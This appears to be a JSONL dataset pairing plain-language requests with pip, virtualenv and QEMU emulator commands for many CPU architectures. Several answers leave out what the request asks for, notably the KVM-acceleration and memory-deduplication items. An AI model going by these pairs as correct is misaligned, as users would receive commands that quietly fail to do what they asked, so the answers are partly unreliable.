{"input": "Mark 'example.com' as a trusted host when installing a package using pip", "answer": "pip install requests --trusted-host example.com"}
{"input": "Install the 'scipy' package using pip3 with a specific proxy server", "answer": "pip3 install scipy --proxy http://user:pass@proxy.server:port"}
{"input": "Uninstall all Python packages that were installed using pipx", "answer": "pipx uninstall-all"}
{"input": "Install a Python package into an existing virtual environment managed by pipx", "answer": "pipx inject <existing_venv> <package_name>"}
{"input": "Create a Python virtual environment in the directory `myenv` with access to the system site-packages", "answer": "virtualenv --system-site-packages myenv"}
{"input": "Create a virtual environment in `venv` with no seed packages installed and clear the directory if it already exists", "answer": "virtualenv --no-seed --clear venv"}
{"input": "Generate a virtual environment in `env` with a custom prompt \"myproject\" and enable verbose output", "answer": "virtualenv --prompt=\"myproject\" -v env"}
{"input": "Set up a virtual environment in `env` with no setuptools or wheel installed and use the `pip` seeder method", "answer": "virtualenv --no-setuptools --no-wheel --seeder=pip env"}
{"input": "Start an ARM64 virtual machine using QEMU with 4 CPUs, 2GB of RAM, and a raw disk image named `disk.img`", "answer": "qemu-system-aarch64 -machine virt -cpu cortex-a57 -smp 4 -m 2G -hda disk.img"}
{"input": "Run an ARM64 virtual machine with a network interface connected to a user-mode network stack and forward port 2222 on the host to port 22 on the guest", "answer": "qemu-system-aarch64 -machine virt -netdev user,id=net0,hostfwd=tcp::2222-:22 -device virtio-net-device,netdev=net0"}
{"input": "Run an ARM64 virtual machine with a custom BIOS image `bios.bin`", "answer": "qemu-system-aarch64 -machine virt -bios bios.bin"}
{"input": "How do I start an ARM virtual machine using QEMU with 2 CPUs, 1GB of RAM, and a specific disk image?", "answer": "qemu-system-arm -machine virt -smp 2 -m 1G -hda disk_image.img"}
{"input": "How do I emulate an ARM machine with a USB controller and connect a USB storage device?", "answer": "qemu-system-arm -machine virt -usb -device usb-storage,drive=usbdrive -drive file=usb_image.img,if=none,id=usbdrive"}
{"input": "How can I start an ARM virtual machine with a network interface connected to a user-mode network stack?", "answer": "qemu-system-arm -machine virt -netdev user,id=mynet0 -device virtio-net-device,netdev=mynet0"}
{"input": "How can I start an ARM virtual machine with a custom BIOS image?", "answer": "qemu-system-arm -machine virt -bios custom_bios.bin"}
{"input": "How do I emulate an ARM machine with a specific UUID for the virtual machine?", "answer": "qemu-system-arm -machine virt -uuid 123e4567-e89b-12d3-a456-426614174000"}
{"input": "How do I emulate an ARM machine with a specific audio backend, such as ALSA?", "answer": "qemu-system-arm -machine virt -audiodev alsa,id=snd0"}
{"input": "How can I start an ARM virtual machine with a specific MAC address for the network interface?", "answer": "qemu-system-arm -machine virt -netdev user,id=mynet0 -device virtio-net-device,netdev=mynet0,mac=52:54:00:12:34:56"}
{"input": "How do I emulate an ARM machine with a specific RTC (Real-Time Clock) base and clock source?", "answer": "qemu-system-arm -machine virt -rtc base=utc,clock=host"}
{"input": "How can I start an ARM virtual machine with a specific monitor interface for QEMU commands?", "answer": "qemu-system-arm -machine virt -monitor stdio"}
{"input": "How can I start an ARM virtual machine with a specific VGA type, such as Cirrus?", "answer": "qemu-system-arm -machine virt -vga cirrus"}
{"input": "How do I emulate an ARM machine with a specific amount of RAM and enable memory ballooning?", "answer": "qemu-system-arm -machine virt -m 2G -device virtio-balloon"}
{"input": "How can I start an ARM virtual machine with a specific amount of RAM and enable memory ballooning?", "answer": "qemu-system-arm -machine virt -m 2G -device virtio-balloon"}
{"input": "How can I start an ARM virtual machine with a specific amount of RAM and enable memory deduplication?", "answer": "qemu-system-arm -machine virt -m 2G"}
{"input": "Start the QEMU persistent reservation helper as a daemon, use the default PID and socket paths, and drop privileges to the user `nobody`", "answer": "qemu-pr-helper -d -u nobody"}
{"input": "Compare the current values of all MSRs against a reference file named `msr_reference.txt` using qemu-vmsr-helper", "answer": "qemu-vmsr-helper --all --compare msr_reference.txt"}
{"input": "Start a QEMU MIPS emulator with 512 MB of RAM, using a raw disk image named `mips_disk.img`, and enable the on-board USB host controller", "answer": "qemu-system-mips -m 512 -hda mips_disk.img -usb"}
{"input": "Emulate a MIPS machine with 2 CPU cores, 1 GB of RAM, and use a CD-ROM image named `mips_cdrom.iso`", "answer": "qemu-system-mips -smp 2 -m 1024 -cdrom mips_cdrom.iso"}
{"input": "Start a MIPS emulator with 1 GB of RAM, using a raw disk image `mips_disk.img`, and redirect the serial output to a file named `serial_output.txt`", "answer": "qemu-system-mips -m 1024 -hda mips_disk.img -serial file:serial_output.txt"}
{"input": "Emulate a MIPS machine with 4 CPU cores, 2 GB of RAM, and use a network bridge backend with the ID `net0` connected to bridge `br0`", "answer": "qemu-system-mips -smp 4 -m 2048 -netdev bridge,id=net0,br=br0 -device e1000,netdev=net0"}
{"input": "Start a MIPS emulator with 512 MB of RAM, using a raw disk image `mips_disk.img`, and enable a VNC display on port 5901", "answer": "qemu-system-mips -m 512 -hda mips_disk.img -vnc :1"}
{"input": "Run a MIPS emulator with 1 GB of RAM, using a kernel image `vmlinux`, an initial RAM disk `initrd.img`, and a device tree blob `mips_dtb`", "answer": "qemu-system-mips -m 1024 -kernel vmlinux -initrd initrd.img -dtb mips_dtb"}
{"input": "Start a MIPS emulator with 256 MB of RAM, using a raw disk image `mips_disk.img`, and disable graphical output to redirect serial I/O to the console", "answer": "qemu-system-mips -m 256 -hda mips_disk.img -nographic"}
{"input": "Start a MIPS emulator with 2 GB of RAM, using a raw disk image `mips_disk.img`, and enable KVM acceleration for better performance", "answer": "qemu-system-mips -m 2048 -hda mips_disk.img"}
{"input": "Emulate a MIPS64 machine with a USB controller enabled, using a CD-ROM image `cdrom.iso`, and redirect the serial output to a file `serial.log`", "answer": "qemu-system-mips64 -usb -cdrom cdrom.iso -serial file:serial.log"}
{"input": "Run a MIPS64 emulator with a custom machine type `malta`, 1GB of RAM, and use a network interface connected to a TAP device", "answer": "qemu-system-mips64 -machine malta -m 1G -netdev tap,id=mynet0,ifname=tap0 -device e1000,netdev=mynet0"}
{"input": "Start a MIPS64 emulator with a VGA display, 256MB of RAM, and use a floppy disk image `floppy.img`", "answer": "qemu-system-mips64 -vga std -m 256M -fda floppy.img"}
{"input": "Emulate a MIPS64 system with a custom BIOS `bios.bin`, 768MB of RAM, and use a network backend in user mode", "answer": "qemu-system-mips64 -bios bios.bin -m 768M -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Start a MIPS64 emulator with a custom device tree blob `dtb.img`, 1GB of RAM, and use a Virtio block device with a disk image `disk.img`", "answer": "qemu-system-mips64 -dtb dtb.img -m 1G -drive file=disk.img,if=virtio"}
{"input": "Run a MIPS64 emulator with 2 CPUs, 1GB of RAM, and use a Virtio network device connected to a bridge `br0`", "answer": "qemu-system-mips64 -smp 2 -m 1G -netdev bridge,id=mynet0,br=br0 -device virtio-net-pci,netdev=mynet0"}
{"input": "Start a QEMU emulation of a MIPS little-endian system with 512 MB of RAM, using a raw disk image named `mips_disk.img`, and enable the on-board USB host controller", "answer": "qemu-system-mipsel -m 512 -hda mips_disk.img -usb"}
{"input": "Emulate a MIPS little-endian system with 1 GB of RAM, 2 CPU cores, and use a CD-ROM image named `mips_cdrom.iso` as the boot device", "answer": "qemu-system-mipsel -m 1024 -smp 2 -cdrom mips_cdrom.iso"}
{"input": "Run a MIPS little-endian system with 256 MB of RAM, using a kernel image named `vmlinux` and an initial RAM disk named `initrd.img`, and append the kernel command line `root=/dev/ram`", "answer": "qemu-system-mipsel -m 256 -kernel vmlinux -initrd initrd.img -append \"root=/dev/ram\""}
{"input": "Start a MIPS little-endian system with 768 MB of RAM, redirect the serial output to a file named `serial_output.log`, and disable graphical output", "answer": "qemu-system-mipsel -m 768 -nographic -serial file:serial_output.log"}
{"input": "Emulate a MIPS little-endian system with 1 GB of RAM, enable KVM acceleration, and use a raw disk image named `mips_disk.img` as the primary hard drive", "answer": "qemu-system-mipsel -m 1024 -hda mips_disk.img"}
{"input": "Start a MIPS little-endian system with 512 MB of RAM, use a BIOS file named `bios.bin`, and boot from a floppy disk image named `floppy.img`", "answer": "qemu-system-mipsel -m 512 -bios bios.bin -fda floppy.img"}
{"input": "Run a MIPS little-endian system with 1 GB of RAM, enable a VNC display on port 5901, and use a raw disk image named `mips_disk.img`", "answer": "qemu-system-mipsel -m 1024 -hda mips_disk.img -vnc :1"}
{"input": "Start a MIPS little-endian system with 512 MB of RAM, use a device tree blob named `mips_dtb`, and boot from a kernel image named `vmlinux`", "answer": "qemu-system-mipsel -m 512 -kernel vmlinux -dtb mips_dtb"}
{"input": "Start a MIPS little-endian system with 512 MB of RAM, use a parallel flash image named `pflash.img`, and boot from a kernel image named `vmlinux`", "answer": "qemu-system-mipsel -m 512 -kernel vmlinux -pflash pflash.img"}
{"input": "Start a QEMU emulation for an Alpha machine with 2 CPUs, 4GB of RAM, and use a raw disk image named `disk.img`", "answer": "qemu-system-alpha -smp 2 -m 4G -hda disk.img"}
{"input": "Emulate an Alpha machine with 1 CPU, 2GB of RAM, and use a CD-ROM image named `cdrom.iso` as the boot device", "answer": "qemu-system-alpha -smp 1 -m 2G -cdrom cdrom.iso -boot d"}
{"input": "Start an Alpha machine with 4 CPUs, 8GB of RAM, and enable KVM acceleration for better performance", "answer": "qemu-system-alpha -smp 4 -m 8G"}
{"input": "Emulate an Alpha machine with 1 CPU, 512MB of RAM, and use a VNC display for graphical output", "answer": "qemu-system-alpha -smp 1 -m 512M -display vnc=:1"}
{"input": "Emulate an Alpha machine with 1 CPU, 1GB of RAM, and disable graphical output, redirecting serial I/O to the console", "answer": "qemu-system-alpha -smp 1 -m 1G -nographic"}
{"input": "Start an Alpha machine with 4 CPUs, 8GB of RAM, and use a kernel image named `vmlinux` with an initial RAM disk named `initrd.img`", "answer": "qemu-system-alpha -smp 4 -m 8G -kernel vmlinux -initrd initrd.img"}
{"input": "Emulate an Alpha machine with 1 CPU, 1GB of RAM, and use a custom monitor interface for QEMU", "answer": "qemu-system-alpha -smp 1 -m 1G -monitor telnet:127.0.0.1:55555,server,nowait"}
{"input": "Start an Alpha machine with 4 CPUs, 8GB of RAM, and use a custom migration incoming port for live migration", "answer": "qemu-system-alpha -smp 4 -m 8G -incoming tcp:0:4444"}
{"input": "Emulate an Alpha machine with 2 CPUs, 4GB of RAM, and use a custom UUID for the machine", "answer": "qemu-system-alpha -smp 2 -m 4G -uuid 123e4567-e89b-12d3-a456-426614174000"}
{"input": "Start an Alpha machine with 4 CPUs, 8GB of RAM, and use a custom kernel image with a custom initrd", "answer": "qemu-system-alpha -smp 4 -m 8G -kernel vmlinux -initrd initrd.img"}
{"input": "Emulate an Alpha machine with 1 CPU, 1GB of RAM, and use a custom kernel image with a custom initrd and device tree blob (DTB)", "answer": "qemu-system-alpha -smp 1 -m 1G -kernel vmlinux -initrd initrd.img -dtb alpha.dtb"}
{"input": "Emulate an AVR system with a serial port redirected to a TCP socket on port 4444", "answer": "qemu-system-avr -serial tcp::4444,server,nowait"}
{"input": "Start an AVR emulation with a virtual instruction counter enabled and set to 2^10 clock ticks per instruction", "answer": "qemu-system-avr -icount shift=10"}
{"input": "Start a QEMU emulator for the HPPA architecture with 2 CPUs, 4GB of RAM, and use a raw disk image named `hppa_disk.img`", "answer": "qemu-system-hppa -smp 2 -m 4G -hda hppa_disk.img"}
{"input": "Start a QEMU HPPA emulator with a network interface connected to a user-mode network backend and a MAC address of `52:54:00:12:34:56`", "answer": "qemu-system-hppa -netdev user,id=mynet0 -device e1000,netdev=mynet0,mac=52:54:00:12:34:56"}
{"input": "Run a QEMU HPPA emulator with a TPM device using a passthrough backend and a cancel path `/sys/class/misc/tpm0/device/cancel`", "answer": "qemu-system-hppa -tpmdev passthrough,id=tpm0,cancel-path=/sys/class/misc/tpm0/device/cancel -device tpm-tis,tpmdev=tpm0"}
{"input": "Start a QEMU emulation for an M68K machine with 512 MB of RAM and use a raw disk image named `disk.img` as the primary hard drive", "answer": "qemu-system-m68k -m 512 -hda disk.img"}
{"input": "Emulate an M68K machine with 2 CPU cores, 1 GB of RAM, and use a CD-ROM image named `cdrom.iso` as the boot device", "answer": "qemu-system-m68k -smp 2 -m 1024 -cdrom cdrom.iso -boot d"}
{"input": "Start an M68K emulation with 256 MB of RAM, disable graphical output, and redirect serial I/O to the console", "answer": "qemu-system-m68k -m 256 -nographic -serial mon:stdio"}
{"input": "Emulate an M68K machine with 1 CPU core, 512 MB of RAM, and use a custom BIOS file named `bios.bin`", "answer": "qemu-system-m68k -smp 1 -m 512 -bios bios.bin"}
{"input": "Emulate an M68K machine with 4 CPU cores, 2 GB of RAM, and use a kernel image named `vmlinux` with the command line argument `root=/dev/sda1`", "answer": "qemu-system-m68k -smp 4 -m 2048 -kernel vmlinux -append \"root=/dev/sda1\""}
{"input": "Emulate an M68K machine with 2 CPU cores, 512 MB of RAM, and use a serial port redirected to a PTY device", "answer": "qemu-system-m68k -smp 2 -m 512 -serial pty"}
{"input": "Start a QEMU MicroBlaze emulation with 512 MB of RAM, using a raw disk image named `disk.img`, and enable the on-board USB host controller", "answer": "qemu-system-microblaze -m 512M -hda disk.img -usb"}
{"input": "Run a MicroBlaze emulation with 256 MB of RAM, using a kernel image named `vmlinux`, and pass the kernel command line argument `root=/dev/sda1`", "answer": "qemu-system-microblaze -m 256M -kernel vmlinux -append \"root=/dev/sda1\""}
{"input": "Start a MicroBlaze emulation with 1 GB of RAM, using a raw disk image named `disk.img`, and redirect the serial output to a file named `serial.log`", "answer": "qemu-system-microblaze -m 1G -hda disk.img -serial file:serial.log"}
{"input": "Emulate a MicroBlaze machine with 512 MB of RAM, using a raw disk image named `disk.img`, and enable a VNC display on port 5901", "answer": "qemu-system-microblaze -m 512M -hda disk.img -vnc :1"}
{"input": "Run a MicroBlaze emulation with 512 MB of RAM, using a raw disk image named `disk.img`, and enable a graphical display using the GTK backend", "answer": "qemu-system-microblaze -m 512M -hda disk.img -display gtk"}
{"input": "Start a MicroBlaze emulation with 1 GB of RAM, using a raw disk image named `disk.img`, and configure a serial port to connect to a PTY (pseudo-terminal)", "answer": "qemu-system-microblaze -m 1G -hda disk.img -serial pty"}
{"input": "Start a QEMU virtual machine with the MicroBlaze Little Endian architecture, using a raw disk image named `disk.img` and allocate 512 MB of RAM", "answer": "qemu-system-microblazeel -hda disk.img -m 512"}
{"input": "Launch a QEMU MicroBlaze Little Endian virtual machine with 2 CPU cores, 1 GB of RAM, and a CD-ROM image named `boot.iso`", "answer": "qemu-system-microblazeel -smp 2 -m 1024 -cdrom boot.iso"}
{"input": "Run a QEMU MicroBlaze Little Endian virtual machine with a custom machine type, 256 MB of RAM, and a floppy disk image named `floppy.img`", "answer": "qemu-system-microblazeel -machine type=my-custom-machine -m 256 -fda floppy.img"}
{"input": "Launch a QEMU MicroBlaze Little Endian virtual machine with a USB controller enabled, a hard disk image named `hd.img`, and a custom UUID", "answer": "qemu-system-microblazeel -usb -hda hd.img -uuid 123e4567-e89b-12d3-a456-426614174000"}
{"input": "Start a QEMU MicroBlaze Little Endian virtual machine with a VNC display, 1 GB of RAM, and a network interface connected to a user-mode network backend", "answer": "qemu-system-microblazeel -display vnc=:1 -m 1024 -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Run a QEMU MicroBlaze Little Endian virtual machine with a custom BIOS file named `custom_bios.bin`, 512 MB of RAM, and a hard disk image named `system.img`", "answer": "qemu-system-microblazeel -bios custom_bios.bin -m 512 -hda system.img"}
{"input": "Start a QEMU MicroBlaze Little Endian virtual machine with a TPM device using a passthrough backend, 256 MB of RAM, and a kernel image named `bzImage`", "answer": "qemu-system-microblazeel -tpmdev passthrough,id=tpm0 -device tpm-tis,tpmdev=tpm0 -m 256 -kernel bzImage"}
{"input": "Launch a QEMU OR1K emulator with 1 CPU core, 1 GB of RAM, and a CD-ROM image named `boot.iso` as the boot device", "answer": "qemu-system-or1k -smp 1 -m 1024 -cdrom boot.iso -boot d"}
{"input": "Start a QEMU OR1K emulator with 256 MB of RAM, disable graphical output, and redirect serial I/O to the console", "answer": "qemu-system-or1k -m 256 -nographic -serial mon:stdio"}
{"input": "Launch a QEMU OR1K emulator with 1 CPU core, 512 MB of RAM, and use a kernel image named `vmlinux` with the command-line argument `root=/dev/sda1`", "answer": "qemu-system-or1k -smp 1 -m 512 -kernel vmlinux -append \"root=/dev/sda1\""}
{"input": "Run a QEMU OR1K emulator with 1 GB of RAM, a raw disk image named `disk.img`, and enable a VNC server on port 5901 for remote display", "answer": "qemu-system-or1k -m 1024 -hda disk.img -vnc :1"}
{"input": "Start a QEMU OR1K emulator with 2 CPU cores, 1.5 GB of RAM, and use a BIOS file named `bios.bin`", "answer": "qemu-system-or1k -smp 2 -m 1536 -bios bios.bin"}
{"input": "Launch a QEMU OR1K emulator with 512 MB of RAM, a raw disk image named `disk.img`, and enable a user-mode network backend with DHCP", "answer": "qemu-system-or1k -m 512 -hda disk.img -netdev user,id=net0 -device e1000,netdev=net0"}
{"input": "Start a QEMU OR1K emulator with 256 MB of RAM, a raw disk image named `disk.img`, and enable a serial port redirected to a PTY", "answer": "qemu-system-or1k -m 256 -hda disk.img -serial pty"}
{"input": "Start a QEMU emulation of a SH4EB machine with 512MB of RAM and use a raw disk image named `disk.img`", "answer": "qemu-system-sh4eb -m 512 -hda disk.img"}
{"input": "Emulate a SH4EB machine with 2 CPU cores, 1GB of RAM, and use a CD-ROM image named `cdrom.iso`", "answer": "qemu-system-sh4eb -smp 2 -m 1024 -cdrom cdrom.iso"}
{"input": "Emulate a SH4EB machine with 1 CPU core, 512MB of RAM, and redirect the serial output to a file named `serial.log`", "answer": "qemu-system-sh4eb -smp 1 -m 512 -serial file:serial.log"}
{"input": "Emulate a SH4EB machine with 2 CPU cores, 512MB of RAM, and use a network interface connected to a TAP device", "answer": "qemu-system-sh4eb -smp 2 -m 512 -netdev tap,id=mynet0,ifname=tap0 -device e1000,netdev=mynet0"}
{"input": "Emulate a SH4EB machine with 1 CPU core, 512MB of RAM, and use a custom BIOS file named `bios.bin`", "answer": "qemu-system-sh4eb -smp 1 -m 512 -bios bios.bin"}
{"input": "Start a SH4EB machine with 1GB of RAM, use a kernel image named `vmlinux`, and pass the kernel command line `root=/dev/sda1`", "answer": "qemu-system-sh4eb -m 1024 -kernel vmlinux -append \"root=/dev/sda1\""}
{"input": "Start a QEMU emulation for a TriCore machine with 2 CPUs, 512MB of RAM, and use a raw disk image named `disk.img`", "answer": "qemu-system-tricore -smp 2 -m 512M -hda disk.img"}
{"input": "Start a TriCore emulation with 1 CPU, 128MB of RAM, and disable graphical output to run in a terminal", "answer": "qemu-system-tricore -smp 1 -m 128M -nographic"}
{"input": "Start a TriCore emulation with 1 CPU, 256MB of RAM, and enable a virtual network interface connected to a user-mode network stack", "answer": "qemu-system-tricore -smp 1 -m 256M -netdev user,id=net0 -device e1000,netdev=net0"}
{"input": "Start a TriCore emulation with 1 CPU, 128MB of RAM, and enable a VNC server for remote display on port 5901", "answer": "qemu-system-tricore -smp 1 -m 128M -vnc :1"}
{"input": "Start a TriCore emulation with 2 CPUs, 512MB of RAM, and enable a virtual sound device using the ALSA backend", "answer": "qemu-system-tricore -smp 2 -m 512M -audiodev alsa,id=snd0 -device intel-hda -device hda-duplex,audiodev=snd0"}
{"input": "Emulate a TriCore machine with 1 CPU, 256MB of RAM, and use a custom machine type named `my-machine`", "answer": "qemu-system-tricore -smp 1 -m 256M -machine my-machine"}
{"input": "Emulate a TriCore machine with 4 CPUs, 1GB of RAM, and use a parallel flash image named `pflash.img`", "answer": "qemu-system-tricore -smp 4 -m 1G -pflash pflash.img"}
{"input": "Emulate a TriCore machine with 2 CPUs, 512MB of RAM, and use a custom monitor socket for QMP communication", "answer": "qemu-system-tricore -smp 2 -m 512M -qmp unix:qmp-socket,server,nowait"}
{"input": "Emulate a TriCore machine with 4 CPUs, 1GB of RAM, and use a custom RTC base set to UTC", "answer": "qemu-system-tricore -smp 4 -m 1G -rtc base=utc"}
{"input": "Start a TriCore emulation with 2 CPUs, 512MB of RAM, and enable a virtual serial port connected to a PTY", "answer": "qemu-system-tricore -smp 2 -m 512M -serial pty"}
{"input": "Start a TriCore emulation with 1 CPU, 256MB of RAM, and enable a virtual SATA controller", "answer": "qemu-system-tricore -smp 1 -m 256M -device ahci"}
{"input": "Start a TriCore emulation with 4 CPUs, 1GB of RAM, and enable a virtual USB storage device", "answer": "qemu-system-tricore -smp 4 -m 1G -device usb-storage,drive=drive0 -drive if=none,id=drive0,file=disk.img"}
{"input": "Start a QEMU emulator for the Xtensa architecture with 2 CPUs, 512MB of RAM, and use a raw disk image named `disk.img`", "answer": "qemu-system-xtensa -smp 2 -m 512M -hda disk.img"}
{"input": "Launch a QEMU Xtensa emulator with a custom machine type, 4 CPUs, and 1GB of RAM, using a CD-ROM image named `boot.iso`", "answer": "qemu-system-xtensa -machine mymachine -smp 4 -m 1G -cdrom boot.iso"}
{"input": "Start a QEMU Xtensa emulator with 1 CPU, 256MB of RAM, and redirect the serial output to a file named `serial.log`", "answer": "qemu-system-xtensa -smp 1 -m 256M -serial file:serial.log"}
{"input": "Start a QEMU Xtensa emulator with 1 CPU, 256MB of RAM, and use a network interface connected to a user-mode network stack", "answer": "qemu-system-xtensa -smp 1 -m 256M -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Run a QEMU Xtensa emulator with 2 CPUs, 512MB of RAM, and use a VNC display for graphical output", "answer": "qemu-system-xtensa -smp 2 -m 512M -display vnc=:1"}
{"input": "Start a QEMU Xtensa emulator with 1 CPU, 128MB of RAM, and use a TPM device with a passthrough backend", "answer": "qemu-system-xtensa -smp 1 -m 128M -tpmdev passthrough,id=tpm0 -device tpm-tis,tpmdev=tpm0"}
{"input": "Start a QEMU emulation for an XtensaEB machine with 2 CPUs, 512MB of RAM, and use a raw disk image named \"disk.img\"", "answer": "qemu-system-xtensaeb -smp 2 -m 512M -hda disk.img"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 1GB of RAM, and enable KVM acceleration for better performance", "answer": "qemu-system-xtensaeb -smp 4 -m 1G"}
{"input": "Emulate an XtensaEB machine with 2 CPUs, 512MB of RAM, and redirect the serial output to a file named \"serial.log\"", "answer": "qemu-system-xtensaeb -smp 2 -m 512M -serial file:serial.log"}
{"input": "Start an XtensaEB machine with 1 CPU, 128MB of RAM, and use a custom BIOS file named \"bios.bin\"", "answer": "qemu-system-xtensaeb -smp 1 -m 128M -bios bios.bin"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 2GB of RAM, and enable graphical output using the SDL display backend", "answer": "qemu-system-xtensaeb -smp 4 -m 2G -display sdl"}
{"input": "Start an XtensaEB machine with 1 CPU, 512MB of RAM, and use a kernel image named \"vmlinux\" with the command line \"root=/dev/sda1\"", "answer": "qemu-system-xtensaeb -smp 1 -m 512M -kernel vmlinux -append \"root=/dev/sda1\""}
{"input": "Emulate an XtensaEB machine with 2 CPUs, 1GB of RAM, and use a network interface connected to a user-mode network stack", "answer": "qemu-system-xtensaeb -smp 2 -m 1G -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Start an XtensaEB machine with 1 CPU, 256MB of RAM, and use a VNC display for remote access on port 5901", "answer": "qemu-system-xtensaeb -smp 1 -m 256M -display vnc=:1"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 2GB of RAM, and use a custom device tree blob (DTB) file named \"dtb.img\"", "answer": "qemu-system-xtensaeb -smp 4 -m 2G -dtb dtb.img"}
{"input": "Start an XtensaEB machine with 1 CPU, 256MB of RAM, and use a kernel image named \"vmlinux\" with an initial RAM disk named \"initrd.img\"", "answer": "qemu-system-xtensaeb -smp 1 -m 256M -kernel vmlinux -initrd initrd.img"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 2GB of RAM, and use a custom VGA type \"virtio\" for the display", "answer": "qemu-system-xtensaeb -smp 4 -m 2G -vga virtio"}
{"input": "Start an XtensaEB machine with 1 CPU, 256MB of RAM, and use a custom audio backend with ALSA", "answer": "qemu-system-xtensaeb -smp 1 -m 256M -audiodev alsa,id=snd0"}
{"input": "Emulate an XtensaEB machine with 2 CPUs, 512MB of RAM, and use a custom machine type \"my-machine\"", "answer": "qemu-system-xtensaeb -smp 2 -m 512M -machine my-machine"}
{"input": "Start an XtensaEB machine with 1 CPU, 128MB of RAM, and use a custom CPU model \"my-cpu\"", "answer": "qemu-system-xtensaeb -smp 1 -m 128M -cpu my-cpu"}
{"input": "Emulate an XtensaEB machine with 2 CPUs, 512MB of RAM, and use a custom monitor interface on port 4444", "answer": "qemu-system-xtensaeb -smp 2 -m 512M -monitor tcp:127.0.0.1:4444,server,nowait"}
{"input": "Start an XtensaEB machine with 1 CPU, 128MB of RAM, and use a custom UUID for the machine", "answer": "qemu-system-xtensaeb -smp 1 -m 128M -uuid 123e4567-e89b-12d3-a456-426614174000"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 2GB of RAM, and use a custom RTC base set to UTC", "answer": "qemu-system-xtensaeb -smp 4 -m 2G -rtc base=utc"}
{"input": "Start an XtensaEB machine with 1 CPU, 256MB of RAM, and use a custom snapshot mode for the disk image", "answer": "qemu-system-xtensaeb -smp 1 -m 256M -snapshot"}
{"input": "Start an XtensaEB machine with 1 CPU, 128MB of RAM, and use a custom parallel port redirected to a file", "answer": "qemu-system-xtensaeb -smp 1 -m 128M -parallel file:parallel.log"}
{"input": "Emulate an XtensaEB machine with 4 CPUs, 2GB of RAM, and use a custom debug console redirected to a file", "answer": "qemu-system-xtensaeb -smp 4 -m 2G -debugcon file:debug.log"}
{"input": "Start an XtensaEB machine with 1 CPU, 256MB of RAM, and use a custom watchdog action to power off the machine on timeout", "answer": "qemu-system-xtensaeb -smp 1 -m 256M -watchdog-action poweroff"}
{"input": "Emulate an XtensaEB machine with 2 CPUs, 512MB of RAM, and use a custom migration incoming port 5555", "answer": "qemu-system-xtensaeb -smp 2 -m 512M -incoming tcp::5555"}
{"input": "Start a PowerPC emulation with 2 CPUs, 512MB of RAM, and use a raw disk image named `disk.img`", "answer": "qemu-system-ppc -smp 2 -m 512M -hda disk.img"}
{"input": "Emulate a PowerPC machine with 1 CPU, 256MB of RAM, and use a VNC display for graphical output", "answer": "qemu-system-ppc -smp 1 -m 256M -display vnc=:1"}
{"input": "Boot a PowerPC machine with a custom device tree blob (DTB) file named `dtb.img` and an initial RAM disk named `initrd.img`", "answer": "qemu-system-ppc -M mac99 -kernel vmlinux -dtb dtb.img -initrd initrd.img"}
{"input": "Start a PowerPC emulation with 2 CPUs, 1GB of RAM, and connect it to a TAP network interface named `tap0`", "answer": "qemu-system-ppc -smp 2 -m 1G -netdev tap,id=mynet0,ifname=tap0 -device e1000,netdev=mynet0"}
{"input": "Emulate a PowerPC machine with 1 CPU, 512MB of RAM, and use a USB mouse and keyboard", "answer": "qemu-system-ppc -smp 1 -m 512M -usb -device usb-mouse -device usb-kbd"}
{"input": "Boot a PowerPC machine with a custom kernel command line and disable graphical output", "answer": "qemu-system-ppc -kernel vmlinux -append \"root=/dev/sda1 console=ttyS0\" -nographic"}
{"input": "Start a PowerPC emulation with 4 CPUs, 2GB of RAM, and use a virtio network device connected to a user-mode network stack", "answer": "qemu-system-ppc -smp 4 -m 2G -netdev user,id=mynet0 -device virtio-net-pci,netdev=mynet0"}
{"input": "Start a QEMU virtual machine with a PowerPC 64-bit architecture, using a raw disk image named `disk.img`, and allocate 2GB of RAM", "answer": "qemu-system-ppc64 -m 2048 -hda disk.img"}
{"input": "Launch a PowerPC 64-bit virtual machine with 4 CPU cores, 4GB of RAM, and a CD-ROM image named `boot.iso`", "answer": "qemu-system-ppc64 -smp 4 -m 4096 -cdrom boot.iso"}
{"input": "Start a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and use a VNC display for remote access on port 5901", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -vnc :1"}
{"input": "Start a PowerPC 64-bit virtual machine with 2 CPU cores, 1GB of RAM, and use a custom BIOS file named `bios.bin`", "answer": "qemu-system-ppc64 -smp 2 -m 1024 -bios bios.bin"}
{"input": "Run a PowerPC 64-bit virtual machine with 1 CPU core, 1GB of RAM, and attach a network interface connected to a user-mode network stack", "answer": "qemu-system-ppc64 -smp 1 -m 1024 -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Start a PowerPC 64-bit virtual machine with 1 CPU core, 1GB of RAM, and disable graphical output, redirecting serial I/O to the console", "answer": "qemu-system-ppc64 -smp 1 -m 1024 -nographic -serial mon:stdio"}
{"input": "Start a PowerPC 64-bit virtual machine with 1 CPU core, 1GB of RAM, and use a custom monitor socket for QMP communication on port 4444", "answer": "qemu-system-ppc64 -smp 1 -m 1024 -qmp tcp:localhost:4444,server,nowait"}
{"input": "Start a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and use a custom parallel flash image named `pflash.img`", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -pflash pflash.img"}
{"input": "Run a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and use a custom UUID for the machine", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -uuid 123e4567-e89b-12d3-a456-426614174000"}
{"input": "Start a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and use a custom firmware configuration (fw_cfg) entry", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -fw_cfg name=opt/myconfig,file=config.txt"}
{"input": "Launch a PowerPC 64-bit virtual machine with 1 CPU core, 1GB of RAM, and enable a virtual Virtio network device", "answer": "qemu-system-ppc64 -smp 1 -m 1024 -netdev user,id=net0 -device virtio-net-pci,netdev=net0"}
